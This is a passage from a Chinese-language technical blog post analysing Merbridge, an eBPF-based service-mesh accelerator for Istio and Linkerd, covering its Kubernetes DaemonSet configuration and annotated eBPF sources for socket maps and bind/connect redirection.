class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nsenter --net=/proc/1/ns/net ip -o addr | awk '&#123;print $4&#125;'</span><br><span class="line">127.0.0.1/8</span><br><span class="line">::1/128</span><br><span class="line">192.168.19.84/16</span><br><span class="line">fe80::250:56ff:fe82:8bd7/64</span><br><span class="line">172.17.0.1/16</span><br><span class="line">fe80::42:8aff:fe54:fa57/64</span><br><span class="line">10.244.0.0/32</span><br><span class="line">fe80::e4a0:b4ff:fe2e:2c1f/64</span><br><span class="line">10.244.0.1/24</span><br><span class="line">fe80::a4b8:52ff:fef8:6b8a/64</span><br><span class="line">fe80::24c6:d7ff:fe20:b8b7/64</span><br><span class="line">fe80::e83b:a4ff:fe7b:7321/64</span><br><span class="line">fe80::d44b:31ff:fe17:a41c/64</span><br><span class="line">fe80::5855:4fff:feef:92f0/64</span><br><span class="line">fe80::c09c:62ff:fe21:df97/64</span><br><span class="line">fe80::b8ba:35ff:fe1f:505f/64</span><br><span class="line">fe80::186e:7aff:fe98:59e4/64</span><br><span class="line">fe80::4cb5:dff:fea6:d245/64</span><br><span class="line">fe80::4468:7bff:fe40:6b09/64</span><br><span class="line">fe80::61:aeff:fece:58ee/64</span><br><span class="line">fe80::30ee:22ff:fee8:2fee/64</span><br></pre></td></tr></table></figure><p>之后通过tee命令将结果写入到<code>/host/ips/ips.txt</code>中。</p><p>从这里我们就可以看到，初始化容器的作用就是获取主机的ip地址信息，并将结果存入到<code>ips.txt</code>中。 Init 容器初始化完毕后就会自动终止，但是 Init 容器初始化结果会保留到应用容器和sidecar容器中。</p><p><code>containers</code></p><p><code>containers</code>和初始化容器的镜像是相同的。<code>containers</code>中也有两个<code>mountPath</code>。用到了<code>.spec.volumes</code>下的<code>host-ips</code>和<code>sys-fs</code>，挂载路径为容器中的<code>/host/ips</code>和<code>/sys/fs</code>，通过<code>securityContext</code>定义了容器需要特权模式运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">containers:</span><br><span class="line">      - image: ghcr.io/merbridge/merbridge:latest</span><br><span class="line">        imagePullPolicy: Always</span><br><span class="line">        name: merbridge</span><br><span class="line">        args: #为容器设置启动时要执行的命令和参数</span><br><span class="line">        - /app/mbctl</span><br><span class="line">        - -m</span><br><span class="line">        - istio</span><br><span class="line">        - --ips-file</span><br><span class="line">        - /host/ips/ips.txt</span><br><span class="line">        lifecycle: </span><br><span class="line">          preStop: </span><br><span class="line">            exec:</span><br><span class="line">              command: </span><br><span class="line">              - make</span><br><span class="line">              - -k</span><br><span class="line">              - clean</span><br><span class="line">        resources: </span><br><span class="line">          requests:</span><br><span class="line">            cpu: 100m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">          limits:</span><br><span class="line">            cpu: 300m</span><br><span class="line">            memory: 200Mi</span><br><span class="line">        securityContext: </span><br><span class="line">          privileged: true</span><br><span class="line">        volumeMounts: </span><br><span class="line">          - mountPath: /sys/fs</span><br><span class="line">            name: sys-fs</span><br><span class="line">          - mountPath: /host/ips</span><br><span class="line">            name: host-ips</span><br></pre></td></tr></table></figure><p>看一下该容器中的执行参数。通过源码我们看到<code>-m</code>是服务网格的模式，当前所支持的是<code>istio</code>和<code>linkerd</code>。这里我们使用的是<code>istio</code>，<code>--ips-file</code>是当前节点的ip信息的文件名，即在<code>initContainers</code>中我们将ip信息写入的路径<code>/host/ips/ips.txt</code>。</p><p><code>lifecycle</code>字段是管理容器在运行前和关闭前的一些动作。其中<code>preStop</code>是容器被终止前的任务，用于优雅关闭应用程序、通知其他系统。这里在容器被终止前执行<code>make clean</code>用于清除之前编译的可执行文件及配置文件。</p><p>第五段，pod相应策略</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dnsPolicy: ClusterFirst #针对每个Pod设置DNS的策略,ClusterFirst为默认配置</span><br><span class="line">nodeSelector: #约束一个Pod只能在特定的节点上运行</span><br><span class="line">  kubernetes.io/os: linux</span><br><span class="line">priorityClassName: system-node-critical #将Pod标记为关键性</span><br><span class="line">restartPolicy: Always</span><br><span class="line">serviceAccount: merbridge</span><br><span class="line">serviceAccountName: merbridge</span><br><span class="line">tolerations: #应用于Pod上的，允许Pod调度到带有与之匹配的污点的节点上。</span><br><span class="line">- key: CriticalAddonsOnly #允许pod被重新调度</span><br><span class="line">  operator: Exists</span><br><span class="line">- operator: Exists</span><br></pre></td></tr></table></figure><h4 id="eBPF程序分析"><a href="#eBPF程序分析" class="headerlink" title="eBPF程序分析"></a>eBPF程序分析</h4><h5 id="helpers-h"><a href="#helpers-h" class="headerlink" title="helpers.h"></a><code>helpers.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/swab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) __builtin_bswap16(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) __builtin_bswap32(x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htons(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bpf_htonl(x) (x)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"__BYTE_ORDER__ error"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __section</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __section(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储socket信息的映射表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取组id</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_pid_tgid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_pid_tgid;</span><br><span class="line"><span class="comment">//获取uid</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_uid_gid)() = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_uid_gid;</span><br><span class="line"><span class="comment">//根据用户定义的输出，将BPF程序产生的对应日志消息保存在用来跟踪内核的文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*bpf_trace_printk)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, <span class="keyword">int</span> fmt_size,</span></span></span><br><span class="line"><span class="function"><span class="params">                                ...)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_trace_printk;</span><br><span class="line"><span class="comment">//用当前进程名字填充第一个参数地址</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_current_comm)(<span class="keyword">void</span> *buf, __u32 size_of_buf) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_current_comm;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_ops获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_ops)(struct bpf_sock_ops *skops) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//获取套接字的cookie，套接字通过bpf_sock_addr获得</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_get_socket_cookie_addr)(struct bpf_sock_addr *ctx) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_get_socket_cookie;</span><br><span class="line"><span class="comment">//在bpf_map中查找与key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *(*bpf_map_lookup_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key) =</span><br><span class="line">    (<span class="keyword">void</span> *)BPF_FUNC_map_lookup_elem;</span><br><span class="line"><span class="comment">//添加或更新map中key关联的条目</span></span><br><span class="line"><span class="keyword">static</span> __u64 (*bpf_map_update_elem)(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">const</span> <span class="keyword">void</span> *key,</span><br><span class="line">                                    <span class="keyword">const</span> <span class="keyword">void</span> *value, __u64 flags) = (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_map_update_elem;</span><br><span class="line"><span class="comment">//在子网络名称空间netns中查找与TCP套接字匹配的元组</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *(*<span class="title">bpf_sk_lookup_tcp</span>)(</span></span><br><span class="line"><span class="class">    <span class="title">void</span> *<span class="title">ctx</span>, <span class="title">struct</span> <span class="title">bpf_sock_tuple</span> *<span class="title">tuple</span>, __<span class="title">u32</span> <span class="title">tuple_size</span>, __<span class="title">u64</span> <span class="title">netns</span>,</span></span><br><span class="line"><span class="class">    __<span class="title">u64</span> <span class="title">flags</span>) = (<span class="title">void</span> *)<span class="title">BPF_FUNC_sk_lookup_tcp</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sk_release)</span><span class="params">(struct bpf_sock *sock)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_sk_release;</span><br><span class="line"><span class="comment">//添加或更新引用套接字的sockhash map</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_sock_hash_update)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    struct bpf_sock_ops *skops, struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key,</span></span></span><br><span class="line"><span class="function"><span class="params">    __u64 flags)</span> </span>= (<span class="keyword">void</span> *)BPF_FUNC_sock_hash_update;</span><br><span class="line"><span class="comment">//消息重定向</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*bpf_msg_redirect_hash)</span><span class="params">(struct sk_msg_md *md, struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">void</span> *key, __u64 flags)</span> </span>= (<span class="keyword">void</span> *)</span><br><span class="line">    BPF_FUNC_msg_redirect_hash;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PRINTNL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">"\n"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINT_SUFFIX <span class="meta-string">""</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> printk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> printk(fmt, ...)                                                       \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = fmt PRINT_SUFFIX;                                     \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEBUG</span></span><br><span class="line"><span class="comment">// do nothing</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...) (&#123;&#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">// only print traceing in debug mode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> debugf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> debugf(fmt, ...)                                                       \</span></span><br><span class="line">    (&#123;                                                                         \</span><br><span class="line">        <span class="keyword">char</span> ____fmt[] = <span class="string">"[debug] "</span> fmt PRINT_SUFFIX;                          \</span><br><span class="line">        bpf_trace_printk(____fmt, <span class="keyword">sizeof</span>(____fmt), ##__VA_ARGS__);             \</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">is_port_listen_current_ns</span><span class="params">(<span class="keyword">void</span> *ctx, __u16 port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock_tuple</span> <span class="title">tuple</span> = &#123;</span>&#125;;</span><br><span class="line">    tuple.ipv4.dport = bpf_htons(port);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_sock</span> *<span class="title">s</span> = <span class="title">bpf_sk_lookup_tcp</span>(<span class="title">ctx</span>, &amp;<span class="title">tuple</span>, <span class="title">sizeof</span>(<span class="title">tuple</span>.<span class="title">ipv4</span>),</span></span><br><span class="line"><span class="class">                                           <span class="title">BPF_F_CURRENT_NETNS</span>, 0);</span></span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        bpf_sk_release(s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">origin_info</span> &#123;</span></span><br><span class="line">    __u32 pid;</span><br><span class="line">    __u32 ip;</span><br><span class="line">    __u16 port;</span><br><span class="line">    <span class="comment">// last bit means that ip of process is detected.</span></span><br><span class="line">    __u16 flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//存储源ip 目的ip 源端口和目的端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pair</span> &#123;</span></span><br><span class="line">    __u32 sip;</span><br><span class="line">    __u32 dip;</span><br><span class="line">    __u16 sport;</span><br><span class="line">    __u16 dport;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="maps-h"><a href="#maps-h" class="headerlink" title="maps.h"></a><code>maps.h</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"helpers.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存原始目的地址信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">cookie_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前节点中的pod的ip信息,将已经注入Sidecar的Pod IP地址写入local_pod_ips</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">local_pod_ips</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存envoy的ip地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">process_ip</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">1024</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存四元组信息和对应的原始目的地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">pair_original_dst</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(struct origin_info),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存当前sock和四元组信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> __<span class="title">section</span>("<span class="title">maps</span>") <span class="title">sock_pair_map</span> = &#123;</span></span><br><span class="line">    .type = BPF_MAP_TYPE_SOCKHASH,</span><br><span class="line">    .key_size = <span class="keyword">sizeof</span>(struct pair),</span><br><span class="line">    .value_size = <span class="keyword">sizeof</span>(__u32),</span><br><span class="line">    .max_entries = <span class="number">65535</span>,</span><br><span class="line">    .map_flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="mb-bind-c"><a href="#mb-bind-c" class="headerlink" title="mb_bind.c"></a><code>mb_bind.c</code></h5><p>劫持 bind 系统调用并修改地址。目前该项目支持<code>Istio</code>和<code>linkerd</code>，<code>mb_bind.c</code>程序会判断<code>mesh</code>的类型是否为<code>linkerd</code>，如果是会将监听地址从<code>127.0.0.1:4140</code>变为<code>0.0.0.0:4140</code>，<code>4140</code>端口是<code>linkerd</code>的出站流量重定向端口。</p><p>在<code>mb_connect.c</code>中，作者为了避免四元组产生冲突，将目的地址修改为<code>127.x.y.z</code>而不是<code>127.0.0.1</code>，而在<code>linkerd</code>源码中是不允许修改的，如下图所示</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/2.png" alt="2"></p><p>针对该代码的具体细则可参考链接：<a href="https://github.com/linkerd/linkerd2-proxy/pull/1442" target="_blank" rel="noopener">https://github.com/linkerd/linkerd2-proxy/pull/1442</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/helpers.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"headers/mesh.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__section(<span class="string">"cgroup/bind4"</span>) <span class="function"><span class="keyword">int</span> <span class="title">mb_bind</span><span class="params">(struct bpf_sock_addr *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MESH != LINKERD</span></span><br><span class="line">    <span class="comment">// only works on linkerd</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;user_ip4 == <span class="number">0x0100007f</span> &amp;&amp;</span><br><span class="line">        ctx-&gt;user_port == bpf_htons(OUT_REDIRECT_PORT)) &#123;</span><br><span class="line">        __u64 uid = bpf_get_current_uid_gid() &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (uid == SIDECAR_USER_ID) &#123;</span><br><span class="line">            printk(<span class="string">"change bind address from 127.0.0.1:%d to 0.0.0.0:%d"</span>,</span><br><span class="line">                   OUT_REDIRECT_PORT, OUT_REDIRECT_PORT);</span><br><span class="line">            ctx-&gt;user_ip4 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> ____license[] __section(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br><span class="line"><span class="keyword">int</span> _version __section(<span class="string">"version"</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h5 id="mb-connect-c"><a href="#mb-connect-c" class="headerlink" title="mb_connect.c"></a><code>mb_connect.c</code></h5><p>劫持<code>connect</code>系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 